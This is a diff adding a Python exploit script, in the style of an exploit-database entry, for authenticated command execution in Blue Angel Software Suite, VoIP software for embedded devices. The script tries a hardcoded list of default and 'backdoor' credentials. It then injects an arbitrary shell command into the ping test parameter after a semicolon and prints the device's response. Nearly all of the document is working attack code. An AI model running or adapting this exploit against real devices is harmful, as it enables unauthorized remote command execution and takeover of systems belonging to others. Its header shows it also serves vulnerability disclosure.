@@ -1,0 +1,102 @@
+# Exploit Title: Blue Angel Software Suite - Authenticated Command Execution
+# Google Dork: N/A
+# Date: 02/05/2019
+# Exploit Author: Paolo Serracino 
+# Vendor Homepage: http://www.5vtechnologies.com
+# Software Link: N/A
+# Version: All
+# Tested on: Embedded Linux OS
+# CVE : N/A
+# Description: Blue Angel Software Suite, an application that runs on embedded devices for VOIP/SIP services is vulnerable to an authenticated 
+# command execution in ping command. All default accounts can be used to login and achieve command execution, including the guest one. 
+# Moreover there's another account, defined in the local file device.dat, that provides an apparently "backdoor" account.
+# A list of these accounts is hardcoded in the script.
+
+#/usr/bin/python
+import sys
+import requests
+
+
+def check_sw(target,port):
+
+  res = requests.get(target + ':' + port)
+
+  if '/cgi-bin/webctrl.cgi?action=index_page' in res.text:
+     return True
+  else:
+     print "[-] DOES NOT LOOK LIKE THE PAGE WE'RE LOOKING FOR"
+     return False
+
+def check_login(target,port,command):
+
+   if not check_sw(target,port):
+      sys.exit()
+
+   creds_common = [('blueangel','blueangel'), #the "backdoor" account
+                   ('root','abnareum10'),
+                   ('root','Admin@tbroad'),
+                   ('root','superuser'),
+                   ('user','user') ,
+                   ('guest','guest'),
+                   ]
+ 
+   for i in range(len(creds_common)):
+      postdata=[('action','login_authentication'),
+               ('redirect_action','sysinfo_page'),
+               ('login_username',creds_common[i][0]),
+               ('login_password',creds_common[i][1]),
+               ('B1','Login')
+               ]
+
+      res = requests.post(target + ':' + port + '/cgi-bin/webctrl.cgi',data=postdata)
+
+      if 'Set-Cookie' in res.headers:
+         cookie = res.headers.get('Set-Cookie')
+         print '[+] LOGGED IN WITH CREDENTIALS  ' + str(creds_common[i][0] + ' : ' + creds_common[i][1]) 
+         execute_cmd(target,port,cookie,command)  
+         return True
+
+
+def execute_cmd(target,port,cookie,cmd):
+
+   print '[+] EXECUTING COMMAND'
+   new_headers = ({'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
+                 'Referer': target,
+                 'Cookie': cookie
+                })
+   res = requests.get(target + ':' + port + '/cgi-bin/webctrl.cgi?action=pingtest_update&ping_addr=127.0.0.1;' + cmd + '&B1=PING',headers=new_headers)
+   res_lines = res.text.splitlines()
+   result = []
+   copy = False
+
+   for line in res_lines:
+
+      if 'round-trip min/avg/max' in line:
+         copy = True
+      elif '</pre></body></html>' in line: 
+         copy = False
+      elif copy == True:
+         result.append(line)
+
+   print('[+] COMMAND RESPONSE')
+   print('------------------------------------------')
+
+   for r in result:
+      print r
+   print('------------------------------------------')
+
+
+def main():
+
+   if len(sys.argv) < 4:
+      print '[-] 3 ARGS: TARGET PORT SHELL_COMMAND'
+      sys.exit()
+   
+   target = sys.argv[1]   
+   port = sys.argv[2]
+   command = sys.argv[3]
+   if not check_login(target,port,command):
+      print '[-] COULD NOT FIND VALID CREDENTIALS'
+      
+if __name__ == "__main__":
+    main()
